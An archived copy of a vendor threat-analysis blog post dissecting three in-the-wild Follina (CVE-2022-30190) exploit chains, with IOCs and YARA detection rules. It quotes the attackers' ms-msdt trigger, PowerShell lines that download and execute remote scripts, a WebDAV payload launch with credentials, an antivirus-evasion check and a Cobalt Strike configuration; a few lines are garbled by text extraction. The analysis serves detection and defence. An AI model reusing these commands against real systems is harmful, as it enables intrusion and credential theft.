{
    "id": "a1ff68d5-9ef6-4e65-9135-f95059db0167",
    "created_at": "2023-01-12T15:10:37.897509Z",
    "updated_at": "2025-03-27T02:11:33.909762Z",
    "deleted_at": null,
    "sha1_hash": "166b9e093a8e2a6122bcab79150de800bfc74654",
    "title": "2022-07-27 - Threat analysis- Follina exploit fuels 'live-off-the-land' attacks",
    "authors": "",
    "file_creation_date": "2022-08-18T03:54:28Z",
    "file_modification_date": "2022-08-18T03:54:28Z",
    "file_size": 2316299,
    "plain_text": "# Threat analysis: Follina exploit fuels 'live-off-the-land' attacks\n\n**[blog.reversinglabs.com/blog/threat-analysis-follina-exploit-powers-live-off-the-land-attacks](https://blog.reversinglabs.com/blog/threat-analysis-follina-exploit-powers-live-off-the-land-attacks)**\n\n[Threat Research](https://blog.reversinglabs.com/blog/tag/threat-research)\n| July 27, 2022\n\nBlog Author\n[Joseph Edwards, Senior Malware Researcher at ReversingLabs. Read More...](https://blog.reversinglabs.com/blog/author/joseph-edwards)\n\n\n-----\n\nAn analysis of three in-the-wild payloads delivered using the recently discovered Follina exploit shows how attackers can use it to achieve\npersistent access in victim environments and turbo-charge efforts to ‘live off the land’ and avoid detection by security monitoring tools.\n\nExecutive Summary\n\n[ReversingLabs analyzed three malicious payloads circulating online that have been linked to use of the newly discovered Follina exploit in](https://twitter.com/nao_sec/status/1530196847679401984?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1530196847679401984%7Ctwgr%5E%7Ctwcon%5Es1_c10&ref_url=https%3A%2F%2Fcdn.embedly.com%2Fwidgets%2Fmedia.html%3Ftype%3Dtext2Fhtmlkey%3Da19fcc184b9711e1b4764040d3dc5c07schema%3Dtwitterurl%3Dhttps3A%2F%2Ftwitter.com%2Fnao_sec%2Fstatus%2F1530196847679401984image%3Dhttps3A%2F%2Fi.embed.ly%2F1%2Fimage3Furl3Dhttps253A252F252Fabs.twimg.com252Ferrors252Flogo46x38.png26key3Da19fcc184b9711e1b4764040d3dc5c07)\nMicrosoft’s Support Diagnostic Tool (MSDT). ReversingLabs analyzed three attack chains that used the Follina exploit to gain a foothold within\ntarget systems. Our research revealed that the Follina exploit is being used to deliver a range of common exploitation and persistence tools\nincluding Cobalt Strike, Mimikatz (a credential harvesting utility) as well as PowerShell scripts used to obtain persistent access and harvest\ndata and credentials from victim networks.\n\nAdditionally, we discovered attacks using novel methodologies, including the use of syscalls to obfuscate malicious payloads and avoid API\nmonitoring technologies; use of the \"net use\" command with a username and password to execute the payload on a mounted network share;\nand deployment of novel, as-yet unidentified malware.\n\nThe research underscores the threat posed by Follina, which greatly enhances the ability of malicious actors to “live off the land” within victim\nenvironments: leveraging native administrative tools and functions to elevate access permissions.\n\n## Overview\n\nThe so-called Follina exploit is one of the most serious remote code execution (RCE) vulnerabilities in recent memory. First disclosed in May,\n2021, the vulnerability (CVE-2022-30190) affects the Microsoft Support Diagnostic Tool, a standard component of the company’s Windows\noperating system. According to Microsoft, Follina is a remote code execution vulnerability that can be exploited when MSDT is called using the\nURL protocol from an application (for example: Microsoft Word).\n\nAn attacker who successfully exploits the Follina vulnerability can run arbitrary code with the privileges of the calling application. The attacker\ncan then install programs, view, change, or delete data, or create new accounts in the context allowed by the user’s rights. That could allow a\n[remote, unauthenticated attacker to take control of an affected system, according to an alert from CISA. Microsoft issued](https://www.cisa.gov/uscert/ncas/current-activity/2022/05/31/microsoft-releases-workaround-guidance-msdt-follina-vulnerability) guidance for\n[remediating the flaw and then, in mid June, a patch for the underlying vulnerability.](https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/)\n\nResearchers at Microsoft and elsewhere discovered the Follina exploit being used in phishing documents and active campaigns. To assess the\nnature of the threat, ReversingLabs hunted for Follina exploitation samples using its Titanium platform, then analyzed them to observe what\nfinal payloads are being delivered in-the-wild in conjunction with use of the Follina exploit. ReversingLabs researcher Joseph Edwards\ncollected three samples of threats. Her is his analysis of each.\n\n## Analysis\n\n Exploit Chain 1: Cobalt Strike Beacon hosted on WebDAV Share\n\n### Document Stage\n\n\n-----\n\nThe document we observed is a relations file stored in a Word document, but is typically not visible to end users.\n\ndocument.xml.rels (b16d0271ff1bc6e508dbf6a2183644926f3631038d6be30cc9e615efc5e2e903)\n\nIn analyzing this document, the relationship of interest is the Type oleObject, in bold below. Note that the TargetMode is “External” and points\nto a third party website: https[://]files.attend-doha-expo[.]com/inv.html. Also make note of the \"!\" character at the end of the target URL, which is\nan important part of triggering additional processing of the HTML payload.\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n\n<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId8\"\n\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable\" Target=\"fontTable.xml\"/><Relationship Id=\"rId3\"\n\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings\" Target=\"settings.xml\"/><Relationship Id=\"rId7\"\n\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\" Target=\"media/image2.JPG\"/><Relationship Id=\"rId2\"\n\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles\" Target=\"styles.xml\"/><Relationship Id=\"rId1\"\n\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/numbering\" Target=\"numbering.xml\"/><Relationship Id=\"rId6\"\n\n**Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"https://files.attend-doha-**\n**expo.com/inv.html!\" TargetMode=\"External\" /><Relationship Id=\"rId5\"**\n\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\" Target=\"media/image1.png\"/><Relationship Id=\"rId4\"\n\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings\" Target=\"webSettings.xml\"/><Relationship Id=\"rId9\"\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme\" Target=\"theme/theme1.xml\"/></Relationships>\n\n### HTML Stage\n\nThe file we observed:exploit\n\n_inv.html (4f643bf57abe70e3c4ed64f05167da5d6c35f2dac1d7fda78523ab231f903575)_\n\nThis is an HTML file with embedded JavaScript that invokes ms-msdt, the Microsoft Support Diagnostic Tool (MSDT) protocol handler, passing\na list of options. As designed, MSDT is a utility that in invoked when files of unknown types are encountered. MSDT allows the user to indicate\nwhich program they would like to use to open a given file. A copy of this file appears below.\n\n<head></head>\n\n<body>\n\n<script>\n\n//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...[*4096 bytes, truncated]\n\nwindow.location.href = \"ms-msdt:/id PCWDiagnostic /skip force /param \\\"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu\nIT_SelectProgram=NotListed\n\nIT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+\n\n[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+\n\n[char]34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bc\n\n[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\\\"\";\n\n</script>\n\n</body>\n\nA few observations about this file:\n\nNote the parameter at the end: IT_AutoTroubleshoot=ts_AUTO, which takes the specified actions without user interaction or\nauthentication.\nNote the use of the command IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu, which opens the context menu for\nselecting a program to open. In this case it is \"calc\", but this could be used to launch any application.\nIn the file below, the IT_SelectProgram=NotListed IT_BrowseForFile= command is used to select the \"Program Not Listed\" option and\nbrowse to the file to be used.\nIn this case, a Base64-encoded blob is parsed to resolve the file path. That explains the string:\ni/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe, which is inserted at the end so that if the handler parses the\n**IT_BrowseForFile argument, looking for a path to a legitimate Windows executable, the argument will pass that check.**\n\nThe Base64-encoded blob is parsed and executed as a PowerShell command using Invoke-Expression:\n\n\n-----\n\n$c d C \\ do s\\syste 3 \\c d e e ;\nStart-Process $cmd -windowstyle hidden -ArgumentList \"/c taskkill /f /im msdt.exe\";\n\nStart-Process $cmd -windowstyle hidden -ArgumentList \"/c net use z: \\\\5.206.224.233\\webdav\\ /user:user `$RFVbgtyuJ32D &&\n**z:\\osdupdate.exe && net use z: /delete \";**\n\nNote that first the PowerShell command ends the msdt.exe process which executes as a result of the ms-msdt protocol handler. Next, the\nPowerShell commands log into a WebDAV file share at the remote server 5.206[.]224.233, using the username user and the password\n_$RFVbgtyuJ32D, and mounts the server as a network share at drive letter Z. Using the Windows terminal cmd.exe, the script launches a file_\nnamed osdupdate.exe and removes the network share.\n\n### Payload Stage\n\nThe payload delivered via this exploit chain was:\n\n_osdupdate.exe (083d27a598e1a4c93dc8a9b446ca95c4c7b7b8f2e5fc2f6020b162ead8c91bdf)_\n\nOur analysis shows that this payload is a loader for a Cobalt Strike beacon. The malware uses direct syscalls to evade API monitoring or\nmodule hooking by endpoint detection and response (EDR) technology.\n\nAdditionally, the following APIs are used but obscured within the payload:\n\nZwAllocateVirtualMemory\nZwGetContextThread\nZwProtectVirtualMemory\nZwResumeThread\nZwSetContextThread\nZwTerminateProcess\nZwWriteVirtualMemory\n\nThese APIs allow the process to inject itself with the decrypted shellcode for a Cobalt Strike beacon. The beacon reaches out to the Command\nand Control server telecomly[.]info and was configured with the following options:\n\n{\"BeaconType\": [\"HTTPS\"], \"Port\": 443, \"SleepTime\": 60000, \"MaxGetSize\": 2097328, \"Jitter\": 20,\n\n**\"C2Server\": \"www.telecomly.info,/Collector/2.0/settings/\",**\n\n\"HttpPostUri\": \"/users/8:orgid:c2811-b2a4-2b33-3be12bad1/endpoints/events/poll\",\n\n\"Malleable_C2_Instructions\": [\"Remove 46 bytes from the end\", \"Remove 130 bytes from the beginning\", \"NetBIOS decode 'a'\"], \"SpawnTo\":\n\"x5/Epp7jyIAJUfH0bBiYfw==\", \"HttpGet_Verb\": \"GET\", \"HttpPost_Verb\": \"GET\", \"HttpPostChunk\": 96,\n\n\"Spawnto_x86\": \"%windir%\\\\syswow64\\\\werfault.exe\", \"Spawnto_x64\": \"%windir%\\\\sysnative\\\\werfault.exe\", \"CryptoScheme\": 0,\n\"Proxy_Behavior\": \"Use IE settings\", \"Watermark\": 123456789, \"bStageCleanup\": \"False\", \"bCFGCaution\": \"False\", \"KillDate\": 0,\n\"bProcInject_StartRWX\": \"False\", \"bProcInject_UseRWX\": \"False\", \"bProcInject_MinAllocSize\": 17500, \"ProcInject_PrependAppend_x86\":\n\n[\"kJA=\", \"Empty\"], \"ProcInject_PrependAppend_x64\": [\"kJA=\", \"Empty\"],\n\n\"ProcInject_Execute\": [\"ntdll:RtlUserThreadStart\", \"CreateThread\", \"NtQueueApcThread-s\", \"CreateRemoteThread\", \"RtlCreateUserThread\"],\n\n\"ProcInject_AllocationMethod\": \"NtMapViewOfSection\", \"bUsesCookies\": \"False\", \"HostHeader\": \"\"}\n\n### Significance\n\nThe compelling features that emerged from our analysis of this Follina exploit chain were:\n\nThe use of the \"net use\" command with a username and password to execute the payload on a mounted network share. This prevents\nautomated harvesting from simply using the URL to discover the payload.\nThe use of Cobalt Strike, which enables lateral movement and advanced evasion within a network.\nThe use of direct syscalls to obfuscate the payload and evade API monitoring. This is a newer and infrequently seen technique.\n\n## Exploit Chain 2: PowerShell Stealer and Invoke-Mimikatz\n\n### Document Stage\n\nThe Rich Text Format (RTF) document associated with the exploit chain was:\n\nBasic_Personal_Data_Information_Form.rtf (7641c3d8e2a5159333fb99a851ac8c400bb7fd62fc61c58e6016747045cab0c1)\n\nThis file has two embedded OLE objects that reference external HTML documents. These objects execute automatically without user\ninteraction but do present a prompt to the user, perhaps leaving them with a false sense of security. That prompt is:\n\n\n-----\n\nIn testing, we noticed that the malicious document uses a decoy OLE object if launched via WordPad, reaching out to the following dummy\nURL:\n\nhttp[://]127.0.0.1/side1[.]html\n\nHowever, when opened in Microsoft Word 2016, the OLE object executes the HTML payload at http[://]seller-notification[.]live/1[.]html,\nwhich we discuss in more detail below.\n\n\n-----\n\n### Stage\n\nThe HTML file we detected is:\n\n1.html (b0b952334f0d0195b06faed532170263f7fad6c2)\n\nThis HTML stage was hosted at the web address mentioned above, and several others. The syntax within the JavaScript tags in the HTML file\nthat trigger the ms-msdt: protocol handler is the same. The Base64-encoded string decodes to the following PowerShell commands:\n\nGet-Process -Name msdt|Stop-Process;\n\npowershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('https://seller-notification.live/Zgfbe234dg')\"\n\nThese commands simply stop the msdt.exe process launched by the ms-msdt: handler, then download and execute another PowerShell stage.\n\n### PowerShell Payloads\n\nThe PowerShell script has the identifier da80a38090ef8cb52e91e639ea267c4f24bf3a21\n\nIt contains a number of functions that enable the threat actor to collect and exfiltrate credentials to their Command and Control server at\n**hxxp[://]seller-notification[.]live/upload_file[.]php. ReversingLabs analysis reveals that the script is capable of performing the following**\nactions:\n\nCollecting system time, hostname and public IP addresses\nExtracting credentials from Firefox, Microsoft Credential Store, Opera, Yandex, Vivaldi, Chrome and other browsers\nRetrieving credentials from FileZilla, MobaXterm, Oray SunLogin RemoteClient and other SSH-based clients\nExporting RDP, FTP, Microsoft FTP and other credentials from the Windows Registry\nEnumerating user accounts, groups and administrators using WMIC\nExfiltrating collected data, and the SOFTWARE and SYSTEM registry hives as .zip files and then uploading them to the Command and\nControl (C2) server.\nInstalling a Scheduled Task using the PowerShell commandlet Enable-ScheduledTask and the task name\n**MicrosoftEdgeUpdateTaskMaEnglishAPUAL. This task runs every three weeks, on Monday at 10 am local time and downloads and**\nexecutes an updated version of the above script from hxxp[://]seller-notification[.]live/Zgfbe234dg.\n\nOddly, despite this ‘red flag’ functionality, the above PowerShell script revealed 0/56 detections on VirusTotal. The updated version of the\nscript, Zgfbe234dg, which contains the same features, also has 0/56 detections on VirusTotal. However, the Zgfbe234dg can download and\nexecute an additional script, displayed below:\n\n$string_all = [system.String]::Join(\" \", (Get-Process | Select-Object -Expandproperty ProcessName))\n\nif([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match \"S-1-5-32-544\") -and ($string_all -notlike \"*FortiTray*\" -and\n$string_all -notlike \"*ntrtscan*\" -and $string_all -notlike \"*TMBMSRV*\" -and $string_all -notlike \"*AdAwareService*\" -and $string_all -notlike\n\"*ccEvtMgr*\" -and $string_all -notlike \"*snac*\" -and $string_all -notlike \"*klnagent*\" -and $string_all -notlike \"*kavfswp*\" -and $string_all -notlike\n\"*msseces*\" -and $string_all -notlike \"*MpCmdRun*\" -and $string_all -notlike \"*MSASCui*\" -and $string_all -notlike \"*ntrtscan*\" -and $string_all\n-notlike \"*vba32lder*\" -and $string_all -notlike \"*MongoosaGU*\" -and $string_all -notlike \"*V3Svc*\" -and $string_all -notlike \"*SPHINX*\" -and\n$string_all -notlike \"*PSafeSysTray*\" -and $string_all -notlike \"*NisSrv*\"))\n\n{\n\n(echo \"iex(New-Object Net.WebClient).DownloadString('https://seller-notification.live/JFhfdsfo1234vdv')\"|powershell -) >>\n($Global:filename_path + \"\\hash_123.txt\")\n\n}This new script from hxxps[://]seller-notification[.]live/JFhfdsfo1234vdv is executed only if no processes in the above list are found\nrunning. This would appear to help evade antiviruses that detect the script. This new download stands out because the output (hash_123.txt)\nreferences hashes. In fact, the downloaded JFhfdsfo1234vdv (3c7674214e21cc4ec6a92555a1e6d1ad5c7ed36f) is almost an exact match to\nthe Invoke-Mimikatz script used to harvest credentials from memory. This script is simply obfuscated with concatenation of strings and the\ninsertion of backtick characters. Using Invoke-Mimikatz, a threat actor can reflectively load the credential harvesting tool in memory and avoid\nwriting to disk.\n\n### Significance\n\nThis exploit chain highlights the ways in which a threat actor can capitalize on the Follina exploit to enhance their ability to “live off the land” in\nvictim environments: making little to no use of compiled malware. By opening an avenue on vulnerable systems to use a native Windows\ncomponent, MSDT, Follina gives malicious actors persistent access to vulnerable systems and their credentials.\n\nIn the above example, a threat actor that knew about a variety of common credential stores. They were also aware of security products that\ncould detect credential extraction from memory. This attack illustrates the ways that Follina can enable stealthy compromises and exfiltration\nfrom such environments.\n\n\n-----\n\n## Exploit Chain 3: Unknown Backdoor\n\n### HTML Stage\n\nThe HTML file associated with this exploit chain is:\n\npoc.html (57e73e139dff99884e9287266ca4caf826e7ec3b5e93f737198c6bf970b982f8)\n\nWe discovered this file being hosted at both http[://]65.20[.]75.158/poc[.]html and http[://]t1bet[.]net/poc.html. The syntax within the JavaScript\ntags triggering the ms-msdt: protocol handler is the same. The Base64-encoded text is:\n\nThat text decodes to the following PowerShell command:\n\nTry {\n\n$wc=new-object system.net.webclient;\n\n$wc.downloadfile(\"http://65.20.75.158/0524x86110.exe\",\"$ENV:temp\\wstmp.exe\");\n\n}\n\nCatch {Exit(1);};\n\n**$cmd = \"$ENV:temp\\wstmp.exe\";**\n\nStart-Process $cmd -windowstyle hidden -ArgumentList \"/c rundll32.exe pcwutl.dll,LaunchApplication $cmd\";\n\n$cmd = \"c:\\windows\\system32\\cmd.exe\";\n\nStart-Process $cmd -windowstyle hidden -ArgumentList \"/c taskkill /f /im msdt.exe\";\n\nThe script downloads an executable to the %Temp% directory, naming it wstmp.exe, then executes the payload through the Program\n_Compatibility Troubleshooter Helper_ **pcwutl.dll and its exported function LaunchApplication. Pcwutl.dll is a legitimate Microsoft application**\nused here to possibly evade standard antivirus detections. Note: this payload was also served from the associated domain t1bet[.]net.\n\n### Payload\n\nThe payload associated with this exploit chain is:\n\nwstmp.exe (5217c2a1802b0b0fe5592f9437cdfd21f87da1b6ebdc917679ed084e40096bfd)\n\nThis executable is compressed with the standard packer UPX. Once unpacked, wstmp.exe spawns a rundll32.exe process, with the following\ncommand line arguments:\n\n\"C:\\Windows\\system32\\rundll32.exe\" shell32.dll,Control_RunDLL\n\n**Wstemp.exe injects this new process with a shellcode buffer, so that rundll32.exe connects to the IP address 45.77[.]45.222 on port 110. The**\nfull functionality of this payload needs to be studied further, but the malware did not successfully connect, and the server is likely offline.\n\n### Significance\n\nThis exploit chain included a unique payload execution method, which spawns and injects rundll32.exe for evasion. This payload could not be\neasily grouped into an existing malware family and more analysis of this will be needed going forward.\n\n## Indicators of Compromise\n\n### Filesystem\n\n**SHA1 Hash** **Description**\n\n83fde764f70378b4b0610d87e86faac6dc5bc54b Word Document\n\n6e9e90431e5e660071b683d121ad887d3726a4a0 Embedded XML File\n\n7ed97610cdee3c69be2961543ce619485b680572 HTML Page\n\n\n-----\n\n8ea0fea3e9787f270a9a23e3335b7b8e35475b06 Cobalt Strike Loader\n\n8b095d4f5b1ef62b40507e6155a55214243f2c85 RTF Document\n\n1c52a8bab1e5a107837c2d9abab1c73d571dc15d RTF Document\n\nb0b952334f0d0195b06faed532170263f7fad6c2 HTML Page\n\nda80a38090ef8cb52e91e639ea267c4f24bf3a21 PowerShell Trojan\n\n64e5715d590c54a7c06baceef19e84ef672bc257 PowerShell Trojan\n\n3c7674214e21cc4ec6a92555a1e6d1ad5c7ed36f PowerShell (Invoke-Mimikatz)\n\n70dcbbcc20addef04eae7bf66c1545a935005c69 HTML Page\n\n82b0beb6fff9a90dc40b300ebf1b0ec4977ba8ad Unknown Backdoor\n\n### Network\n\nfiles.attend-doha-expo[.]com\n\n5.206[.]224.233\n\nwww[.]telecomly[.]info\n\nseller-notification[.]live\n\n65.20[.]75.158\n\nt1bet[.]net\n\ntibetyouthcongress[.]com\n\n45.77[.]45.222:110\n\n### Scheduled Tasks\n\nMicrosoftEdgeUpdateTaskMaEnglishAPUAL\n\nMicrosoft\\Windows\\Workplace Join\\AptPackageIndexUpdate (may be hidden from System32\\Tasks and TaskCache in Registry, but visible\nusing Get-ScheduledTask)\n\nYARA rules for hunting both the initial malicious document stage and the HTML/JavaScript stage:\n\nrule MSDT_HTML{\n\nstrings:\n\n$msdt = \"ms-msdt:\" nocase\n\n$str_1 = \"/skip force /param\" nocase\n\n$str_2 = \"IT_RebrowseForFile=\" nocase\n\n$str_3 = \"IT_LaunchMethod=\" nocase\n\n$str_4 = \"IT_SelectProgram=\" nocase\n\n$str_5 = \"IT_BrowseForFile=\" nocase\n\n$str_6 = \"Invoke-Expression\" nocase\n\n$str_7 = \"iex\" nocase\n\n$str_8 = \"IT_AutoTroubleshoot=ts_AUTO\" nocase\n\n\n-----\n\n$st _9 ps gstub e e ocase\n\ncondition:\n\nfilesize<3MB and\n\n$msdt and 3 of ($str_*)\n\n}\n\nrule MSDT_XML{\n\nstrings:\n\n$str_1 = \"TargetMode=\\\"External\\\"\" nocase\n\n$re_1 = /(oleObject|frame)\" Target=\".{3,6}:\\/\\/.{5,50}!\"/\n\n$re_2 = /(oleObject|frame)\" Target=\"\\\\\\\\\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\\\.{5,50}!\"/\n\n$private_re = /(192\\.168\\.\\d{1,3}.\\d{1,3}|10\\.\\d{1,3}.\\d{1,3}\\.\\d{1,3}|172\\.\\d{1,3}.\\d{1,3}\\.\\d{1,3})/\n\ncondition:\n\nfilesize<100KB and\n\n$str_1 and ($re_1 or $re_2) and not $private_re\n\n## Conclusions\n\nThe Follina exploit (CVE-2022-30190), though only recently discovered, is already being used in active attacks “in the wild.” The remote code\n[execution flaw in a common Microsoft Windows component poses serious risks for organizations, which should immediately apply the patch](https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/)\nissued by Microsoft to affected systems.\n\nBy analyzing three campaigns that rely on the Follina exploit, ReversingLabs was able to determine that Follina is being used to push payloads\nassociated with persistent threat actors, including Cobalt Strike, Mimikatz and custom malware. Because it leverages a commonly used\nmodule, Microsoft Support Diagnostic Tool (MSDT), Follina also advances attackers’ ability to operate within compromised environments while\nevading detection. For example, we observed Follina being used to launch another standard administrative tool, PowerShell, to effect lateral\nmovement and data exfiltration within compromised environments. Sophisticated attack methods showed concerted efforts by the attackers\nabove to avoid detection.\n\nBeyond patching systems that are vulnerable, security- and threat hunting teams should familiarize themselves with the indicators of\ncompromise (IOCs) above that are associated with the Follina malware and take steps to monitor for activity within your environment that may\nindicate malicious actors are attempting to leverage the Follina exploit against them.\n\n[ Learn how [researchers discovered the IconBurst NPM software supply chain attack ]](https://blog.reversinglabs.com/blog/iconburst-npm-software-supply-chain-attack-grabs-data-from-apps-websites)\n\nTags:\n[Threat Research](https://blog.reversinglabs.com/blog/tag/threat-research)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-27 - Threat analysis- Follina exploit fuels 'live-off-the-land' attacks.pdf"
    ],
    "report_names": [
        "2022-07-27 - Threat analysis- Follina exploit fuels 'live-off-the-land' attacks.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e90ec9cb-9959-455d-b558-4bafef64d645",
            "created_at": "2022-10-25T16:07:24.222081Z",
            "updated_at": "2025-03-27T02:02:10.14365Z",
            "deleted_at": null,
            "main_name": "Sphinx",
            "aliases": [
                "APT-C-15"
            ],
            "source_name": "ETDA:Sphinx",
            "tools": [
                "AnubisSpy",
                "Backdoor.Oldrea",
                "Bladabindi",
                "Fertger",
                "Havex",
                "Havex RAT",
                "Jorik",
                "Oldrea",
                "PEACEPIPE",
                "njRAT",
                "yellowalbatross"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536237,
    "ts_updated_at": 1743041493,
    "ts_creation_date": 1660794868,
    "ts_modification_date": 1660794868,
    "files": {
        "pdf": "https://archive.orkl.eu/166b9e093a8e2a6122bcab79150de800bfc74654.pdf",
        "text": "https://archive.orkl.eu/166b9e093a8e2a6122bcab79150de800bfc74654.txt",
        "img": "https://archive.orkl.eu/166b9e093a8e2a6122bcab79150de800bfc74654.jpg"
    }
}